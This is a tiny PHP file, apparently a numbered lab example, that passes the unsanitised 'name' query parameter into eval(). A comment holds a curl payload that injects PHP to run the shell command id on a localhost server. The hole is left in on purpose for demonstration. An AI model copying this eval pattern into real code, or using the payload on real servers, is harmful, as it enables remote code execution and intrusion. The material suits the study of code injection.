<?php
// curl -gki 'http://localhost:8000/05_eval.php?name=<?=`id`;//'

$name=$_GET["name"] ?? 'Guest';
$template="Hello $name!";
eval("?>$template");
